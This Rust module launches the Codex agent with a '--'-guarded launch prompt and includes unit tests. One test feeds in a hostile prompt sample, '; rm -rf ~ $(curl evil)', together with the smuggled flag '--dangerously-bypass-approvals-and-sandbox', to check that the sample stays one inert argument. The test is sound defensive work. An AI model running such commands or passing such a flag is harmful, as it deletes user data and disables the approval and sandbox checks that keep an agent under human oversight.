//! Codex harness: runs Codex through pwf's hidden title shim, then `codex -- <prompt>`.
//! Codex has no `--name` flag, so the shim renames the Codex thread via Codex's
//! app-server API while keeping the prompt as a single `--`-guarded positional.

use super::AgentLauncher;
use crate::{
    codex_thread_title,
    engines::pending_work::{
        agent::query::get_thread_title,
        launch::{LaunchPolicy, new_launch_prompt},
        model::Item,
    },
};

const BINARY: &str = "codex";

/// Launches Codex (`codex -- <prompt>`) with the item's launch prompt.
pub(in crate::engines::pending_work) struct CodexLauncher;

impl AgentLauncher for CodexLauncher {
    fn binary(&self) -> &str {
        BINARY
    }

    fn argv(&self, item: &Item, policy: LaunchPolicy, _model: Option<&str>) -> Vec<String> {
        // Codex has no model-selection flag in scope here; `effort` never reaches it.
        codex_thread_title::launch_argv(
            get_thread_title::handle(item.into()),
            item.repo.clone().unwrap_or_default(),
            new_launch_prompt(item, policy),
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn binary_is_codex() {
        assert_eq!(CodexLauncher.binary(), "codex");
    }

    #[test]
    fn builds_title_shim_argv_with_guarded_codex_prompt() {
        let item = Item {
            prompt: "do the thing".to_string(),
            repo: Some("/repo".to_string()),
            ..Item::default_for_test("PWF-0068", "codex dispatch")
        };
        let argv = CodexLauncher.argv(&item, LaunchPolicy::default(), None);
        assert_eq!(argv[1], codex_thread_title::LAUNCH_COMMAND);
        assert!(argv.contains(&"PWF-0068 - codex dispatch".to_string()));
        assert!(argv.contains(&"/repo".to_string()));
        let codex_pos = argv.iter().position(|arg| arg == "codex").unwrap();
        assert_eq!(argv[codex_pos + 1], "--");
        // The launch prompt is a thin pointer (PWF-0093), not the note body.
        assert!(argv[codex_pos + 2].contains("do PWF-0068"));
        assert!(!argv[codex_pos + 2].contains("do the thing"));
    }

    #[test]
    fn hostile_prompt_stays_single_inert_element() {
        // Store data is arbitrary/hostile: it must never become a flag or split across
        // argv elements. argv[0] is fixed; the `--` guard caps options. The note's
        // prompt body is never inlined into the launch prompt at all (PWF-0093), so
        // a hostile body can't reach argv structure regardless.
        let item = Item {
            prompt: "; rm -rf ~ $(curl evil)\n--dangerously-bypass-approvals-and-sandbox"
                .to_string(),
            repo: Some("/repo".to_string()),
            ..Item::default_for_test("PWF-0068", "hostile")
        };
        let argv = CodexLauncher.argv(&item, LaunchPolicy::default(), None);
        assert_eq!(argv[1], codex_thread_title::LAUNCH_COMMAND);
        let codex_pos = argv.iter().position(|arg| arg == "codex").unwrap();
        assert_eq!(argv[codex_pos + 1], "--"); // guard present
        assert_eq!(argv.last().unwrap(), &argv[codex_pos + 2]); // prompt is exactly one trailing element
        assert!(argv[codex_pos + 2].contains("do PWF-0068"));
        assert!(!argv[codex_pos + 2].contains("rm -rf"));
        assert!(!argv[codex_pos + 2].contains("--dangerously-bypass-approvals-and-sandbox"));
    }
}
